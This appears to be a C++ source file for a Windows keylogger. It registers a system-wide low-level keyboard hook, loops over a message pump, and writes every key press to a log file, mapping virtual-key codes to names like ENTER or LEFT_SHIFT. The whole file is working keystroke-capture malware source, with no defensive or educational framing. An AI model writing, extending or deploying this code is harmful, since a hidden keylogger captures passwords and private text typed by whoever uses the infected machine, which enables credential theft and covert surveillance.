#include <iostream>
#include <unordered_map>
#include "KeyLogger.h"
#include "Time.h"
#include "FileLogger.h"

HHOOK g_hook;
Keyboard g_kbd;

void InitKeyLogger() {
    auto str = "\n\n*********************************\n*Log created " + 
                GetCurrentDateTimeAsFormatedString() + 
                "*\n*********************************\n";

    FileLogger::Log(str);
   
    RegisterHook();
    g_kbd.EnableAutorepeat();
}

void RunKeyLogger() {
    while (true) {
       MessagePump();
       HandleKeyStrokes();
    }
}

void RegisterHook() {
    g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, KbdProc, GetModuleHandle(NULL), 0);
}

void UnregisterHook() {
    UnhookWindowsHookEx(g_hook);
}

void MessagePump() noexcept {
    MSG msg;
    while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return;
}

void HandleKeyStrokes() {
    while (const auto e = g_kbd.ReadKey()) {
        if (!e->Ispress()) {
            continue;
        }
        if (const auto keyStroke = KeyCodeToString(e->GetCode())) {
            FileLogger::Log(*keyStroke);
        }
        else {
            FileLogger::Log({static_cast<char>(e->GetCode())});
        }
    }
}

LRESULT KbdProc(int nCode, WPARAM wParam, LPARAM lParam) noexcept {
    if (nCode < 0)
        CallNextHookEx(g_hook, nCode, wParam, lParam);

    auto kbs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

    switch (wParam) {
    case WM_KEYDOWN:
    case WM_SYSKEYDOWN:
        if (!(lParam & 0x40000000) || g_kbd.AutorepeatIsEnabled()) {
            g_kbd.OnKeyPressed(static_cast<unsigned char>(kbs->vkCode));
        }
        break;
    case WM_KEYUP:
    case WM_SYSKEYUP:
        g_kbd.OnKeyReleased(static_cast<unsigned char>(kbs->vkCode));
        break;
    case WM_CHAR:
        g_kbd.OnChar(static_cast<unsigned char>(kbs->vkCode));
        break;
    default:
        break;
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

std::optional<std::string> KeyCodeToString(int keyCode) {
    static const std::unordered_map<int, std::string_view> codes {
        {VK_BACK,                   "BACKSPACE\\"},
        {VK_TAB,                    "TAB\\"},
        {VK_CLEAR,                  "CLEAR\\"},
        {VK_RETURN,                 "ENTER\\"},
        {VK_SHIFT,                  "SHIFT\\"},
        {VK_CONTROL,                "CONTROL\\"},
        {VK_MENU,                   "ALT\\"},
        {VK_PAUSE,                  "PAUSE\\"},
        {VK_CAPITAL,                "CAPS\\"},
        {VK_ESCAPE,                 "ESCAPE\\"},
        {VK_SPACE,                  "SPACE\\"},
        {VK_PRIOR,                  "PAGE_UP\\"},
        {VK_NEXT,                   "PAGE_DOWN\\"},
        {VK_HOME,                   "HOME\\"},
        {VK_END,                    "END\\"},
        {VK_INSERT,                 "INSERT\\"},
        {VK_LEFT,                   "LEFT_ARROW\\"},
        {VK_UP,                     "UP_ARROW\\"},
        {VK_RIGHT,                  "RIGHT_ARROW\\"},
        {VK_DOWN,                   "DOWN_ARROW\\"},
        {VK_SELECT,                 "SELECT\\"},
        {VK_EXECUTE,                "EXECUTE\\"},
        {VK_SNAPSHOT,               "PRINT_SCREEN\\"},
        {VK_DELETE,                 "DEL\\"},
        {VK_HELP,                   "HELP\\"},
        {VK_LWIN,                   "LEFT_WINDOWS_KEY\\"},
        {VK_RWIN,                   "RIGHT_WINDOWS_KEY\\"},
        {VK_APPS,                   "APPLICATION\\"},
        {VK_SLEEP,                  "SLEEP\\"},
        {VK_NUMPAD0,                "NUMERIC_KEYPAD_0\\"},
        {VK_NUMPAD1,                "NUMERIC_KEYPAD_1\\"},
        {VK_NUMPAD2,                "NUMERIC_KEYPAD_2\\"},
        {VK_NUMPAD3,                "NUMERIC_KEYPAD_3\\"},
        {VK_NUMPAD4,                "NUMERIC_KEYPAD_4\\"},
        {VK_NUMPAD5,                "NUMERIC_KEYPAD_5\\"},
        {VK_NUMPAD6,                "NUMERIC_KEYPAD_6\\"},
        {VK_NUMPAD7,                "NUMERIC_KEYPAD_7\\"},
        {VK_NUMPAD8,                "NUMERIC_KEYPAD_8\\"},
        {VK_NUMPAD9,                "NUMERIC_KEYPAD_9\\"},
        {VK_MULTIPLY,               "MULTIPLY\\"},
        {VK_ADD,                    "ADD\\"},
        {VK_SEPARATOR,              "SEPERATOR\\"},
        {VK_SUBTRACT,               "SUBTRACT\\"},
        {VK_DECIMAL,                "DECIMAL\\"},
        {VK_DIVIDE,                 "DIVIDE\\"},
        {VK_F1,                     "F1\\"},
        {VK_F2,                     "F2\\"},
        {VK_F3,                     "F3\\"},
        {VK_F4,                     "F4\\"},
        {VK_F5,                     "F5\\"},
        {VK_F6,                     "F6\\"},
        {VK_F7,                     "F7\\"},
        {VK_F8,                     "F8\\"},
        {VK_F9,                     "F9\\"},
        {VK_F10,                    "F10\\"},
        {VK_F11,                    "F11\\"},
        {VK_F12,                    "F12\\"},
        {VK_NUMLOCK,                "NUMLOCK\\"},
        {VK_SCROLL,                 "SCROLL_LOCK\\"},
        {VK_LSHIFT,                 "LEFT_SHIFT\\"},
        {VK_RSHIFT,                 "RIGHT_SHIFT\\"},
        {VK_LCONTROL,               "LEFT_CONTROL\\"},
        {VK_RCONTROL,               "RIGHT_CONTROL\\"},
        {VK_LMENU,                  "LEFT_ALT\\"},
        {VK_RMENU,                  "RIGHT_ALT\\"},
        {VK_VOLUME_MUTE,            "VOLUME_MUTE\\"},
        {VK_VOLUME_DOWN,            "VOLUME_DOWN\\"},
        {VK_VOLUME_UP,              "VOLUME_UP\\"},
        {VK_MEDIA_NEXT_TRACK,       "MEDIA_NEXT_TRACK\\"},
        {VK_MEDIA_PREV_TRACK,       "MEDIA_PREVIOUS_TRACK\\"},
        {VK_MEDIA_STOP,             "MEDIA_STOP\\"},
        {VK_MEDIA_PLAY_PAUSE,       "MEDIA_PLAY/PAUSE\\"},
        {VK_LAUNCH_MAIL,            "LAUNCH_MAIL\\"},
        {VK_LAUNCH_MEDIA_SELECT,    "SELECT_MEDIA\\"},
        {VK_OEM_PLUS,               "+\\"},
        {VK_OEM_COMMA,              ",\\"},
        {VK_OEM_MINUS,              "-\\"},
        {VK_OEM_PERIOD,             ".\\"},
        //The following keycodes corresponding characters can vary by keyboard so just log the actual keycode
        {VK_OEM_1,                  "0xBA\\"},  
        {VK_OEM_2,                  "0xBF\\"},   
        {VK_OEM_3,                  "0xC0\\"},   
        {VK_OEM_4,                  "0xDB\\"},   
        {VK_OEM_5,                  "0xDC\\"},  
        {VK_OEM_6,                  "0xDD\\"},  
        {VK_OEM_7,                  "0xDE\\"},   
        {VK_OEM_102,                "0xE2\\"}    
    };

    if(codes.contains(keyCode))
        return std::string(codes.at(keyCode));
    return {};
}
